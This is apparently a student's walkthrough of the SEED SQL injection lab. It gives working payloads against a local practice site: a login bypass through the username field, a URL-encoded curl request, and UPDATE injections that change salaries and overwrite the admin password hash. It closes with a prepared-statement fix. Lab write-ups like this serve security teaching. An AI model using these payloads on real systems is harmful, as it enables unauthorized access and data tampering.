# SQL Injection Attack Lab
- SQL injection is a code injection technique that exploits the vulnerability in the interface between web applications and database servers
- setup: add an entry `10.9.0.5 www.seed-server.com` to `/etc/hosts`
- if we want to reset the database, run `sudo rm -rf mysql_data`, `mysql_data` is inside `Labsetup`, and is mounted to `/var/lib/mysql` folder inside the MySQL container

## Task 1: Get Familiar with SQL Statements
- enter the sql container, login to MySQL: `mysql -u root -pdees`

## Task 2: SQL Injection Attack on SELECT Statement
- visit `www.seed-server.com`
- in the login page, users need to provide a user name and a password, use SQL injection to log into the application without knowing any employee's credential
- try
    - if we see the code in `unsafe_home.php`, we can know the filter in the SQL statement is `WHERE name='$input_uname' AND password='$hashed_pwd'`, we cannot inject SQL into password field, because it will be hashed before being put in the SQL statement, instead, we can input `Admin'; #` to the user name field, then the SQL statement becomes
        - `... WHERE name='Admin'; # (all commented out)`
        - we cannot use `Admin'; --` here, because `--` can only comment out single line

### Task 2.1: SQL Injection Attack from webpage
- login as Admin: done

### Task 2.2: SQL Injection Attack from command line
- do task `2.1` without using the webpage, do it with command line tools
- login on the webpage, use HTTP Header Live, we can know that the login action will send a GET request to the server, with parameters in the URL
- use `curl`, we need to replace special characters with their URL encoding, e.g., `#`->`%23`, `'`->`%27`, `;`->`%3B`
- `$ curl 'www.seed-server.com/unsafe_home.php?username=Admin%27%3B%23#&password=1'`

### Task 2.3: Append a new SQL statement
- inject 2 SQL statements together, with the second one being the update or delete statement, i.e., in user name field, input `Admin'; UPDATE credential SET salary=0 WHERE name='Alice'; #`, then login
- it won't work, because there is a countermeasure preventing the attacker from running 2 SQL statements in this attack, specifically, in the `unsafe_home.php`, it finally executes the SQL query using `$conn->query($sql)`, this method can only execute one single statement, to run multiple statements in a method, use `multi_query()`

## Task 3: SQL Injection Attack on UPDATE Statement
- there is an Edit Profile page that allows employees to update their profile information, when employees update their information, the following SQL UPDATE query in `unsafe_edit_backend.php` will be executed
    ```
    $hashed_pwd = sha1($input_pwd);
    $sql = "UPDATE credential SET
            nickname='$input_nickname',
            email='$input_email',
            address='$input_address',
            password='$hashed_pwd',
            PhoneNumber='$input_phonenumber',
            WHERE ID=$id;";
    $conn->query($sql);
    ```
### Task 3.1: Modify your own salary
- input the following content to the NickName field: `', salary=999999 WHERE name='Alice'; #`
### Task 3.2: Modify other people's salary
- input (NickName): `', salary=0 WHERE name='Ted'; #`
### Task 3.3: Modify other people's password
- if we directly set the password, we cannot login with that password, because in the database, it actually stores the hash value (`sha1`) of the password
- to set Admin's password to `123456`, we can calculate `sha1("123456")` first, and set the password attribute in the database to this hash value
- we can use Python
    ```
    >>> import hashlib
    >>> hashlib.sha1("123456".encode()).hexdigest()
    '7c4a8d09ca3762af61e59520943dc26494f8941b'
    ```
- input (NickName): `', password='7c4a8d09ca3762af61e59520943dc26494f8941b' WHERE name='Admin'; #`
- then we can sucessfully login as Admin using password `123456`

## Task 4: Countermeasure - Prepared Statemtent
- the fundamental problem of the SQL injection vulnerability is the failure of separate code from data
- it is important to ensure that the SQL interpreter knows the boundaries of data and code, use *prepared statement*, instead of inline SQL statement
- Compilation of SQL statement
    1. Check Cache
    2. Parsing & Normalization Phase
    3. Compilation Phase
    4. Query Optimization Phase
    5. Add to Cache
- Prepared statement comes into the picture after the compilation but before the execution step, a prepared statement will go through the compilation step, and be turned into a pre-compiled query with empty placeholders for data, these data will not go through compilation step, but are plugged directly into the pre-compiled query
- example: ("i" stands for integer type, and "s" stands for string type)
    ```
    $stmt = $conn->prepare("SELECT name, local, gender
                            FROM table 
                            WHERE id=? AND password=?");
    $stmt->bind_param("is", $id, $pwd);
    $stmt->execute();
    $stmt->bind_result($bind_name, $bind_local, $bind_gender);
    $stmt->fetch();
    ```
- fix the SQL injection vulnerability in this web application (modify `unsafe.php`)
    ```
    $stmt = $conn->prepare("SELECT id, name, eid, salary, ssn
                            FROM credential
                            WHERE name= ? and Password= ?");
    $stmt->bind_param("ss", $input_uname, $hashed_pwd);
    $stmt->execute();

    $stmt->bind_result($id, $name, $eid, $salary, $ssn);
    $stmt->fetch();
    ```
- then, if we login using user name `Admin'#`, we will fail
